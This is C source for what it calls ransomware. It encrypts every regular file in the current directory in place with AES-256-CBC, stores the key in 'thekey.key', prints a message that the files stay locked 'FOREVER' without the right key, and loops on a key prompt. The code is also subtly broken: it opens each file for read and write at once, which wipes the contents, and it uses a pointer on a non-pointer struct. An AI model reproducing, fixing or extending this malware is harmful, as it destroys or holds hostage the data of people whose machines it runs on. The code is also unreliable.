#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dirent.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>
#include <openssl/evp.h>
#include <openssl/rand.h>

#define MAX_PATH 256
#define MAX_FILES 100
#define KEY_LEN 32 
#define IV_LEN 16
#define FERNET_KEY_LEN 44 

typedef struct {
    char files[MAX_FILES][MAX_PATH];
    int file_count;
    unsigned char key[FERNET_KEY_LEN];
    unsigned char iv[IV_LEN];
} RansomwareState;

int is_skippable(const char* filename) {
    const char* skips[] = {"thekey.key", ".key", "requirement.txt"};
    for (int i = 0; i < 3; i++) {
        if (strstr(filename, skips[i])) return 1;
    }
    return 0;
}

void get_target_files(RansomwareState* state) {
    DIR* dir = opendir(".");
    struct dirent* entry;
    struct stat st;
    
    state->file_count = 0;
    while ((entry = readdir(dir)) && state->file_count < MAX_FILES) {
        if (is_skippable(entry->d_name)) continue;
        
        stat(entry->d_name, &st);
        if (S_ISREG(st.st_mode)) {
            strcpy(state->files[state->file_count], entry->d_name);
            state->file_count++;
        }
    }
    closedir(dir);
}

int encrypt_file(const char* filename, const unsigned char* key, const unsigned char* iv) {
    FILE* in_file = fopen(filename, "rb");
    if (!in_file) return 0;
    
    FILE* out_file = fopen(filename, "wb");
    if (!out_file) {
        fclose(in_file);
        return 0;
    }
    
    EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();
    EVP_EncryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, key, iv);
    
    unsigned char inbuf[4096];
    unsigned char outbuf[4096 + EVP_MAX_BLOCK_LENGTH];
    int inlen, outlen;
    
    while ((inlen = fread(inbuf, 1, sizeof(inbuf), in_file)) > 0) {
        EVP_EncryptUpdate(ctx, outbuf, &outlen, inbuf, inlen);
        fwrite(outbuf, 1, outlen, out_file);
    }
    
    EVP_EncryptFinal_ex(ctx, outbuf, &outlen);
    fwrite(outbuf, 1, outlen, out_file);
    
    EVP_CIPHER_CTX_free(ctx);
    fclose(in_file);
    fclose(out_file);
    return 1;
}

int decrypt_file(const char* filename, const unsigned char* key, const unsigned char* iv) {
    FILE* in_file = fopen(filename, "rb");
    if (!in_file) return 0;
    
    FILE* out_file = fopen(filename, "wb");
    if (!out_file) {
        fclose(in_file);
        return 0;
    }
    
    EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();
    EVP_DecryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, key, iv);
    
    unsigned char inbuf[4096];
    unsigned char outbuf[4096];
    int inlen, outlen;
    
    while ((inlen = fread(inbuf, 1, sizeof(inbuf), in_file)) > 0) {
        EVP_DecryptUpdate(ctx, outbuf, &outlen, inbuf, inlen);
        fwrite(outbuf, 1, outlen, out_file);
    }
    
    int final_len;
    EVP_DecryptFinal_ex(ctx, outbuf, &final_len);
    fwrite(outbuf, 1, final_len, out_file);
    
    EVP_CIPHER_CTX_free(ctx);
    fclose(in_file);
    fclose(out_file);
    return 1;
}

int try_decrypt(RansomwareState* state, const char* user_input) {
    
    unsigned char key[FERNET_KEY_LEN];
    unsigned char iv[IV_LEN];
    
    int key_len = strlen(user_input);
    if (key_len < FERNET_KEY_LEN) key_len = FERNET_KEY_LEN;
    
    for (int i = 0; i < FERNET_KEY_LEN; i++) {
        key[i] = (unsigned char)user_input[i % key_len];
    }
    
    memcpy(iv, key + 16, IV_LEN);
    
    int success = 1;
    for (int i = 0; i < state->file_count; i++) {
        if (!decrypt_file(state->files[i], key, iv)) {
            success = 0;
            break;
        }
    }
    
    return success;
}

int main() {
    OpenSSL_add_all_algorithms();
    ERR_load_crypto_strings();
    
    RansomwareState state;
    get_target_files(&state);
    
    if (state.file_count == 0) {
        printf("No files to encrypt!\n");
        return 0;
    }
    
    RAND_bytes(state.key, FERNET_KEY_LEN);
    RAND_bytes(state.iv, IV_LEN);
    FILE* key_file = fopen("thekey.key", "wb");
    fwrite(state.key, 1, FERNET_KEY_LEN, key_file);
    fwrite(state.iv, 1, IV_LEN, key_file);
    fclose(key_file);
    
    int encrypted_count = 0;
    for (int i = 0; i < state.file_count; i++) {
        if (encrypt_file(state->files[i], state.key, state.iv)) {
            encrypted_count++;
        }
    }
    
    printf("Hello friend! All files are blocked!\n");
    printf("Enter correct key to unlock, or files stay encrypted FOREVER!\n\n");
    
    while (1) {
        printf("Enter key to unlock files: ");
        char user_input[1024];
        if (fgets(user_input, sizeof(user_input), stdin) == NULL) break;
        user_input[strcspn(user_input, "\n")] = 0;
        
        if (try_decrypt(&state, user_input)) {
            printf("Thank God! All are now available now.\n");
            break;
        } else {
            printf("Wrong key! Failed to make available.\n");
        }
    }
    
    return 0;
}
